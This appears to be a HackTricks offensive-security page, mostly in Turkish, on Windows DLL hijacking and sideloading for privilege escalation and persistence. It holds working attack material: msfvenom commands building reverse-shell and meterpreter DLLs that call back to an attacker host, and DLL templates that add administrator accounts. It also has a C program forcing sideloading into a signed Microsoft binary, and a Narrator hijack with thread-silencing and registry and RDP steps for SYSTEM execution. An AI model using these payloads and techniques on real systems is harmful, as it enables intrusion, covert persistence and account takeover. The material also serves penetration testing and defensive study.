# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilen bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection, and Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, kalıcılık sağlama ve daha az yaygın olarak ayrıcalık yükseltme için kullanılır. Burada yükseltmeye odaklanılsa da, hijacking yöntemi amaçlar arasında aynıdır.

### Yaygın Teknikler

Bir uygulamanın DLL yükleme stratejisine bağlı olarak farklı etkinliklerde bulunan birkaç yöntem kullanılır:

1. **DLL Replacement**: Gerçek bir DLL'i kötü amaçlı bir tane ile değiştirerek, isteğe bağlı olarak orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanma.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, meşru olandan önce aranacak bir arama yoluna yerleştirerek uygulamanın arama desenini istismar etme.
3. **Phantom DLL Hijacking**: Uygulamanın, mevcut olmayan ama gerekli olduğunu düşündüğü bir DLL olarak yükleyeceği kötü amaçlı bir DLL oluşturma.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'e yönlendirmek için %PATH% veya .exe.manifest / .exe.local gibi arama parametrelerini değiştirme.
5. **WinSxS DLL Replacement**: WinSxS dizinindeki meşru DLL'i kötü amaçlı bir karşılığıyla değiştirme; genellikle DLL side-loading ile ilişkilendirilen bir yöntem.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'i kopyalanmış uygulama ile birlikte kullanıcı kontrollü bir dizine yerleştirerek Binary Proxy Execution tekniklerine benzeyen bir yaklaşım.

> [!TIP]
> DLL sideloading üzerine HTML staging, AES-CTR config'leri ve .NET implantlarını katmanlayarak adım adım bir zincir için aşağıdaki iş akışını inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik DLL'leri Bulma

Sistem içindeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aracını çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve sadece **File System Activity**'yi gösterin:

![](<../../../images/image (153).png>)

Genel olarak **eksik DLL'leri** arıyorsanız, bunu birkaç **saniye** çalışır durumda bırakın.\
Belirli bir yürütülebilir dosya içindeki **eksik DLL'i** arıyorsanız, **başka bir filtre** örneğin "Process Name" "contains" `<exec name>` ayarlayın, uygulamayı çalıştırın ve olay yakalamayı durdurun.

## Eksik DLL'leri İstismar Etme

Ayrıcalık yükseltmek için en iyi şansımız, ayrıcalıklı bir sürecin yüklemeye çalışacağı bir DLL'i, o DLL'in aranacağı yerlerden birine yazabilmektir. Bu durumda, DLL'in orijinalinin bulunduğu klasörden **önce** aranacak bir klasöre kötü amaçlı bir DLL yazabiliriz (garip bir durum), veya DLL'in aranacağı bir klasöre yazabiliriz ve orijinal DLL hiçbir klasörde mevcut olmayabilir.

### DLL Arama Sırası

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)** içinde DLL'lerin nasıl yüklendiği ayrıntılı olarak bulunabilir.

Windows uygulamaları, DLL'leri belirli bir sıra izleyerek önceden tanımlanmış arama yollarından arar. DLL hijacking sorunu, kötü amaçlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesi ve meşru DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

Aşağıda 32-bit sistemlerdeki DLL arama sırasını görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın. (_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu elde eden bir fonksiyon yoktur, ama arama yapılır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun App Paths kayıt anahtarıyla belirtilen uygulama başına yolu içermediğini unutmayın. App Paths anahtarı DLL arama yolu hesaplanırken kullanılmaz.

Bu, SafeDllSearchMode etkinken varsayılan arama sırasıdır. Devre dışı bırakıldığında, mevcut dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün dizininde başlar.

Son olarak, bir DLL yalnızca isim yerine mutlak yol belirterek de yüklenebilir. Bu durumda o DLL yalnızca belirtilen yolda aranır (eğer DLL'in bağımlılıkları varsa, onlar isimle yüklenecekmiş gibi aranır).

Arama sırasını değiştirebilecek başka yollar da vardır ancak burada bunları açıklamayacağım.

### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading'i zorlamak

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in native API'leri ile oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Burada saldırgan kontrollü bir dizin sağlayarak, içe aktarılmış bir DLL'i ismiyle (mutlak yol olmadan ve güvenli yükleme bayrakları kullanılmadan) çözen hedef süreç, o dizinden kötü amaçlı bir DLL yüklemeye zorlanabilir.

Temel fikir
- RtlCreateProcessParametersEx ile süreç parametrelerini oluşturun ve kontrolünüzdeki klasöre (ör. dropper/unpacker'ın bulunduğu dizin) işaret eden özel bir DllPath sağlayın.
- RtlCreateUserProcess ile süreci oluşturun. Hedef ikili bir DLL'i ismiyle çözdüğünde, yükleyici çözümleme sırasında sağlanan bu DllPath'e bakacak ve kötü amaçlı DLL'in hedef EXE ile aynı yerde olmaması durumunda bile güvenilir sideloading yapılmasını sağlayacaktır.

Notlar/sınırlamalar
- Bu, oluşturulan çocuk süreci etkiler; SetDllDirectory ise yalnızca mevcut süreci etkiler.
- Hedef, bir DLL'i ismiyle import etmeli veya LoadLibrary ile yüklemeli (mutlak yol olmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmamalı).
- KnownDLLs ve sabitlenmiş mutlak yollar hijack edilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C örneği (ntdll, geniş dizeler, basitleştirilmiş hata yönetimi):

<details>
<summary>Tam C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath ile DLL sideloading'i zorlamak</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Windows belgelerinde standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- Bir **DLL, belleğe zaten yüklenmiş olanla aynı ada sahipse**, sistem olağan aramayı atlar. Bunun yerine yönlendirme ve manifest kontrolü yapar; aksi takdirde zaten bellekte bulunan DLL'yi kullanır. **Bu durumda, sistem DLL için bir arama gerçekleştirmez**.
- DLL, geçerli Windows sürümü için bir **known DLL** olarak tanınırsa, sistem bilinen DLL'nin kendi sürümünü ve onun bağımlı olduğu DLL'leri kullanır; böylece **arama işlemi atlanır**. Bu bilinen DLL'lerin listesi kayıt defterindeki **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** anahtarında tutulur.
- Bir **DLL'nin bağımlılıkları** varsa, bu bağımlı DLL'lerin araması, ilk DLL tam yol ile belirtilmiş olsa bile yalnızca **module name** ile belirtilmiş gibi yürütülür.

### Escalating Privileges

**Requirements**:

- Farklı ayrıcalıklarla (yatay veya lateral hareket) çalışan veya çalışacak bir işlemi belirleyin ve bu işlemin **bir DLL'den yoksun** olduğunu tespit edin.
- **DLL'nin aranacağı** herhangi bir **dizin** için **write access** sağlandığından emin olun. Bu konum, yürütülebilir dosyanın bulunduğu dizin veya system path içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak karmaşıktır çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilirin eksik bir dll'ye sahip olması gariptir** ve bir de üzerine **system path klasöründe yazma iznine sahip olmak daha da gariptir** (varsayılan olarak sahip olamazsınız). Ancak kötü yapılandırılmış ortamlarda bu mümkün olabilir.\
Şanslıysanız ve gereksinimleri karşılıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC'yi bypass etmek** olsa bile, burada kullanabileceğiniz Windows sürümü için bir **PoC** veya bir Dll hijaking örneği bulabilirsiniz (muhtemelen sadece yazma izniniz olan klasörün yolunu değiştirerek).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'ın imports'larını ve bir dll'in exports'larını şu komutla kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sistem PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için ilginç diğer otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_'dır.

### Örnek

Eğer istismar edilebilir bir senaryo bulursanız, bunu başarıyla istismar etmek için en önemli noktalardan biri, yürütülebilir dosyanın bundan içe aktaracağı tüm fonksiyonları en azından dışa veren bir **dll oluşturmak** olacaktır. Her halükârda, Dll Hijacking, [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) için işe yarayabilir. Bu amaçla yürütme için dll hijacking'e odaklanan çalışmada **how to create a valid dll** örneğini bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **next sectio**n'da bazı **basic dll codes** bulabilirsiniz; bunlar **templates** olarak veya **non required functions exported** eden bir **dll** oluşturmak için faydalı olabilir.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde **execute your malicious code when loaded** yeteneğine sahip bir Dll'dir; aynı zamanda **expose** edip **work** as **exected** by **relaying all the calls to the real library**.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) araçlarıyla, proxify etmek istediğiniz kütüphaneyi seçerek bir yürütülebilir dosyayı belirtebilir ve **generate a proxified dll** veya doğrudan **indicate the Dll** ve **generate a proxified dll** yapabilirsiniz.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) alın:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluştur (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendiniz

Bazı durumlarda derlediğiniz Dll'in victim process tarafından yüklenecek birkaç **export several functions**'ı dışa aktarması gerektiğine dikkat edin; bu functions yoksa **binary won't be able to load** ve **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL örneği: kullanıcı oluşturma</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>İş parçacığı girişine sahip alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlatıldığında hala öngörülebilir, dile özel bir localization DLL'ini yoklar; bu DLL ele geçirilerek keyfi kod yürütme ve kalıcılık sağlanabilir.

Temel bilgiler
- Arama yolu (güncel sürümler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (eski sürümler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore yolunda yazılabilir, saldırgan kontrollü bir DLL varsa, bu yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Herhangi bir export gerekmez.

Procmon ile keşif
- Filtre: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yolun yüklenme girişimini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle, Narrator başlatıldığında yerleştirilmiş DLL yüklenir. Güvenli masaüstünde (oturum açma ekranı) Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın.

RDP-triggered SYSTEM execution (lateral movement)
- Klasik RDP güvenlik katmanına izin verin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP yapın, oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- Yürütme RDP oturumu kapandığında durur — inject/migrate işlemlerini hızla gerçekleştirin.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool (AT) kayıt girdisini (örn. CursorIndicator) klonlayabilir, rastgele bir binary/DLL'yi işaret edecek şekilde düzenleyip içe aktarabilir, ardından `configuration`'ı o AT adına ayarlayabilirsiniz. Bu, Accessibility çerçevesi altında rastgele yürütmeyi proxy eder.

Notes
- `%windir%\System32` altına yazma ve HKLM değerlerini değiştirme admin hakları gerektirir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde yaşayabilir; export'lara gerek yoktur.

## Vaka Çalışması: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme

Bu vaka, Lenovo'nun TrackPoint Quick Menu (`TPQMAssistant.exe`) içindeki **Phantom DLL Hijacking** örneğini gösterir; kayıtlı kimliği **CVE-2025-1729**.

### Zafiyet Detayları

- **Bileşen**: `TPQMAssistant.exe` konumunda `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` her gün saat 09:30'da oturum açmış kullanıcı bağlamında çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir, bu da yerel kullanıcıların rastgele dosya bırakmasına izin verir.
- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeye çalışır ve eksikse "NAME NOT FOUND" kaydı tutar; bu durum yerel dizin aramasının öncelikli olduğunu gösterir.

### Exploit Implementation

Bir saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub'u yerleştirerek eksik DLL'i suistimal edip kullanıcının bağlamında kod yürütme elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak, `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında 09:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yönetici oturumunda medium integrity seviyesinde çalışır.
4. Standart UAC bypass tekniklerini zincirleyerek medium integrity'den SYSTEM ayrıcalıklarına yükseltin.

## Vaka İncelemesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Tehdit aktörleri, MSI tabanlı dropları sıklıkla DLL side-loading ile eşleştirir ve payload'ları güvenilir, imzalı bir işlem altında yürütür.

Zincir özeti
- Kullanıcı MSI indirir. GUI kurulum sırasında (ör. LaunchApplication veya bir VBScript action) bir CustomAction sessizce çalışır ve gömülü kaynaklardan sonraki aşamayı yeniden oluşturur.
- Dropper aynı dizine meşru, imzalı bir EXE ve kötü amaçlı bir DLL yazar (örnek çift: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL arama sırası öncelikle çalışma dizininden wsc.dll'i yükler ve saldırgan kodunu imzalı bir üst işlem altında çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction tablosu:
- Yürütülebilir dosyalar veya VBScript çalıştıran girdilere bakın. Şüpheli örüntü: arka planda gömülü bir dosya çalıştıran LaunchApplication.
- Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/ayrılmış payload'lar:
- Yönetici çıkarımı: msiexec /a package.msi /qb TARGETDIR=C:\out
- Veya lessmsi kullanın: lessmsi x package.msi C:\out
- Bir VBScript CustomAction tarafından birleştirilen ve şifresi çözülen birden fazla küçük fragman arayın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: meşru imzalı host (Avast). Süreç, kendi dizininden adıyla wsc.dll'yi yüklemeye çalışır.
- wsc.dll: saldırgan DLL. Eğer belirli export'lar gerekmiyorsa, DllMain yeterli olabilir; aksi halde, bir proxy DLL oluşturun ve gerekli export'ları gerçek kütüphaneye yönlendirirken payload'u DllMain içinde çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- İhracat gereksinimleri için, payload'unuzu da çalıştıran bir forwarding DLL oluşturmak üzere proxying framework (ör., DLLirant/Spartacus) kullanın.

- Bu teknik, host binary tarafından DLL ad çözümlemesine dayanır. Eğer host mutlak yollar veya güvenli yükleme bayrakları (ör., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export seti seçilirken dikkate alınmalıdır.

## Referanslar

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
